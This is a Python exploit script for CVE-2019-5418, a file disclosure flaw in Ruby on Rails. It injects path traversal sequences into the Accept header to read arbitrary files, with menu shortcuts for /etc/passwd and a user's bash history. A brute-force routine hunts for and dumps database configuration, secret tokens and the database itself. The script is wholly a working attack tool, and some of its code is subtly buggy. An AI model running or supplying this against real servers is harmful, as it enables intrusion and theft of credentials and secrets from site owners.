import sys
import time
import random
try:
    import requests
except ImportError:
    print('\n\033[93m[!] Requests library not found, please install before proceeding.\n\n \033[0m')
    sys.exit(1)

def banner():
    banner = """
    ----------------------------------------------
    Arbitrary Traversal exploit for Ruby on Rails
    CVE-2019-5418
    ----------------------------------------------
    """
    print(banner)

def check_args():
    if len(sys.argv) != 2:
        print("Invalid number of arguments entered!")
        how_to_use = "python3 Bandit.py url"
        print('Use as:', how_to_use)
        sys.exit(1)


def check_url(url):
    status_code = requests.get(url)
    if status_code != 200:
        print("Url is invalid or can not be reached!")
        sys.exit(1)


def read_file(url, file):
    headers = {'Accept': file + '{{'}
    req = requests.get(url, headers=headers)
    return req

def brute_force_data(url):
    # function to brute force sensitive data
    # assuming the person did not rename ruby on rails stable directories
    above = '../'
    base_req = requests.get(url)
    lines = [line.strip() for line in str(base_req.text).splitlines()]
    files = ["db/seeds.rb", "db/structure.sql", "development.sqlite3",
             "config/database.yml", "config/initializers/secret_token.rb"]
    num = ''
    for i in range(8):
        file = above * i + files[0]
        headers = {'Accept': file + '{{'}
        req = requests.get(url, headers)
        output = [line.strip() for line in str(req.text).splitlines()]
        #get number of lines in file before attempting to read files to determine if successful
        if len(lines) != len(output):
            print('Dumping: ', files[0])
            for line in output:
                print(line)
            num = i
            break
        #time.sleep(random.randint(.5, 3))
        #uncomment this to be less noisy on the server
    # now since we know where to look we can read sensitive files
    if num != '':
        files = files[1:]
        for file in files:
            file = above * num + file
            headers = {'Accept': file + '{{'}
            req = requests.get(url, headers)
            output = [line.strip() for line in str(req.text).splitlines()]
            # sanity check
            if len(output) != len(lines) and lines[0] != output[0]:
                print('Dumping: ', file)
                for line in output:
                    print(line)

def main():
    banner()
    check_args()
    url = sys.argv[1]
    while True:
        try:
            file = input("\033[93m[!] Enter file to read (enter quit or q to exit), enter 1 for /etc/passwd, enter 2 for /proc/cpuinfo enter 3 for bash history, enter 4 for seeds.rb: \033[0m")
        except Exception:
            file = raw_input("\033[93m[!] Enter file to read (enter quit or q to exit): \033[0m")
        if file == 'quit' or file == 'q':
                break
        if file == '1':
            file = '../../../../../../../../../etc/passwd'
        elif file == '2':
            file = '../../../../../../../../../proc/cpuinfo'
        elif file == "3":
            file = '../../../../../../../../../home/rails/.bash_history'
            # replace rails with other user if applicable
        response = read_file(url, file)
        print(response.text)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n\033[93m[!] ctrl+c detected from user, quitting.\n\n \033[0m')
